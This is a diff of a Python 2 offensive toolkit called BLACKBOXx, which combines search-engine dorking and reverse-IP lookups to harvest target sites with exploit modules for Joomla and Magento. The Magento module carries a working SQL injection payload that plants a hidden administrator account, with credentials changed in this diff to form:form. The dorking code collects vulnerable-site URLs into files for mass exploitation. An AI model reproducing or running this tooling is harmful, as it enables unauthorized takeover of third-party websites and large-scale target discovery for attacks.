@@ -14,16 +14,15 @@
 #################################################################################
 ### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/
 ### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/
-import requests,json,sys, time, re, os, base64, random,urllib2
+import requests,json,sys, time, re, os, base64, random
 from sys import platform
 from time import gmtime, strftime
 from optparse import OptionParser
-
 __author__     = 'BLACK EYE'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
 __emailadd__   = 'blackdoor197@riseup.net'
 __twitter__    = 'https://twitter.com/0x676'
-__version__    = '0.7'
+__version__    = '0.8'
 __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOXx v%s' % (__version__)
 
@@ -32,7 +31,7 @@ def __banner__():
 	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     |  |  |_ _"
 	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  |-   -|_'_|"
 	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____|__|__|_,_|"
-	print color.W+color.BOLD+"\t\t\t\t\t\t     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC
+	print color.W+color.BOLD+"                                                     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC
 
 def __help__():
 	print color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}"
@@ -151,9 +150,21 @@ class checker:
 ##                                ##
 ####################################
 class dorker:
+	gurl=[]
 	def google(self, dork, start, stop):
-		from google import search
-		urll = []
+		from cookielib import LWPCookieJar
+		from urllib2 import Request, urlopen
+		from urlparse import urlparse, parse_qs
+		home_folder = os.getenv('HOME')
+		if not home_folder:
+			home_folder = os.getenv('USERHOME')
+			if not home_folder:
+				home_folder = '.'
+		cookie_jar = LWPCookieJar(os.path.join(home_folder, '.google-cookie'))
+		try:
+			cookie_jar.load()
+		except Exception:
+			pass
 		def randomm():
 			tld = [
 			'ae', 'am', 'as', 'at',
@@ -196,23 +207,52 @@ class dorker:
 			tld_rand = random.sample(tld, 1)
 			for tldd in tld_rand:
 				return tldd
+		def html(url):
+			request = Request(url)
+			request.add_header('User-Agent',
+				'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)')
+			cookie_jar.add_cookie_header(request)
+			response = urlopen(request)
+			cookie_jar.extract_cookies(response, request)
+			html = response.read()
+			response.close()
+			cookie_jar.save()
+			return html
+		def run(dork, start, stop):
+			tldd = randomm()
+			while start<stop:
+				url = "http://www.google."+tldd+"/search?q="+dork+"&start="+str(start)+"&inurl=https"
+				htmll = html(url)
+				link = re.findall(r'<h3 class="r"><a href="(.*?)"',htmll)
+				for i in link:
+					i=i.strip()
+					o = urlparse(i, 'http')
+					gopen = open("gurl.txt","a")
+					if i.startswith('/url?'):
+						link = parse_qs(o.query)['q'][0]
+						self.gurl.append(link)
+						gopen.write(str(link+"\n"))
+				start+=10
+			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND"
 		tldd = randomm()
-		k = search(dork, tld=tldd, start=start, stop=stop)
 		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd
 		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC
-		#print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(k))+" FOUND"
-		for link in k:
-			print link
+		run(dork, start, stop)
 	def bing(self, ip,dork):
-		bing ='http://www.bing.com/search?q=ip:'+ip+'+'+dork+'=&count=50000'
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" SEARCH URL    :  "+bing
+		url = []
 		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
-		get = requests.get(bing)
-		html = get.content
-		link = re.findall(r'<h2><a href="(.*?)"', html)
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(link))+" FOUND"+color.ENDC
-		for i in link:
-			print i
+		page = 0
+		bopen = open("burl.txt","a")
+		while page <= 102:
+			bing ='http://www.bing.com/search?q=ip:'+ip+'+'+dork+'&count=50&first='+str(page)
+			get = requests.get(bing)
+			html = get.content
+			link = re.findall(r'<h2><a href="(.*?)"', html)
+			for i in link:
+				url.append(i)
+				bopen.write(i+"\n")
+			page += 50
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC
 
 
 ####################################
@@ -323,7 +363,7 @@ class rce:
 			SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
 			INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
 			INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"""
-			query = q.replace("\n", "").format(username="black", password="black")
+			query = q.replace("\n", "").format(username="form", password="form")
 			pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
 			# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
 			r = requests.post(target_url,
@@ -331,7 +371,7 @@ class rce:
 				"filter": base64.b64encode(pfilter),
 				"forwarded": 1})
 			if r.ok:
-				print "{0}/admin with login : admin:admin".format(target_url)
+				print "{0}/admin with login : form:form".format(target_url)
 			else:
 				print "NOT WORKED with {0}".format(target_url)
 
@@ -368,9 +408,37 @@ class dnsinfo:
 			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
 		details = Details()
 		rzlt(details)
-	def viewdns(self):
-		pass
-
+	def viewdns(self,ip):
+		url = "http://viewdns.info/reverseip/?host="+ip+"&t=1"
+		headers = {
+		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'  
+		}
+		r = requests.get(url, headers=headers)
+		text =  r.content
+		sites = re.findall(r"<tr>\s+<td>(.*?)</td><td align=", text)
+		ipp = open(ip+".txt" ,'a')
+		for i in sites:
+			i=i.strip()
+			ipp.write(i+"\n")
+		print color.W+color.BOLD+"[+] "+str(len(sites))+" FOUND"+color.ENDC
+		print color.W+color.BOLD+"[+] Domains is saved in "+ip+".txt"+color.ENDC
+	def hackertarget(self,domain):
+		urll = []
+		url = "http://api.hackertarget.com/reverseiplookup/?q="+domain
+		get = requests.get(url)
+		html = get.content
+		if "No records found for" in html:
+			print"No Websites Found At "+domain
+		else:
+			black = re.findall(r'(.*)', html)
+			black = ' '.join(black).split()
+			ipp = open(domain+".txt" ,'a')
+			for i in black:
+				i = i.strip()
+				urll.append(i)
+				ipp.write(i+"\n")
+			print color.W+color.BOLD+"[+] "+str(len(black))+" FOUND"+color.ENDC
+			print color.W+color.BOLD+"[+] Domains is saved in "+domain+".txt"+color.ENDC
 
 def __main__():
 	__banner__()
@@ -408,11 +476,21 @@ def __main__():
 				help="Parse IP address")
 			parser.add_option("--yougetsignal","-y",
 				help="Get website from yougetsignal",action="store_true")
+			parser.add_option("--viewdns","-v",
+				help="Get website from viewdns",action="store_true")
+			parser.add_option("--hackertarget","-t",
+				help="Get website from hackertarget",action="store_true")
 			(options,args) = parser.parse_args()
 			ip = options.ip
 			yougetsignal = options.yougetsignal
+			viewdns = options.viewdns
+			hackertarget = options.hackertarget
 			if ip and yougetsignal==True:
 				dnsinfo().yougetsignal(ip)
+			if ip and viewdns==True:
+				dnsinfo().viewdns(ip)
+			if ip and hackertarget==True:
+				dnsinfo().hackertarget(ip)
 		if (arg=="rce_joomla"):
 			parser = OptionParser()
 			parser.add_option("--wordlist","-w",
@@ -433,7 +511,7 @@ def __main__():
 			parser = OptionParser()
 			parser.add_option("--dork","-d",
 				help="Dork for get URL")
-			parser.add_option("--start",type=int,
+			parser.add_option("--start",type=int,default=0,
 				help="Number of page for start")
 			parser.add_option("--stop",type=int,
 				help="Number of page to stop")
@@ -441,8 +519,8 @@ def __main__():
 			dork = options.dork
 			start = options.start
 			stop = options.stop
-			#if dork and start and stop:
-			dorker().google(dork, start, stop)
+			if dork and start is not None and stop is not None: 
+				dorker().google(dork, start, stop)
 		if (arg=="bing_dorker"):
 			parser = OptionParser()
 			parser.add_option("--ip")
@@ -462,5 +540,5 @@ if __name__ == '__main__':
 	except KeyboardInterrupt:
 		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
 		sys.exit(0)
-	except urllib2.HTTPError:
-		print color.BOLD+color.R+"503 : Error Retry Later Plz !"+color.ENDC
+	#except urllib2.HTTPError:
+	#	print color.BOLD+color.R+"503 : Error Retry Later Plz !"+color.ENDC
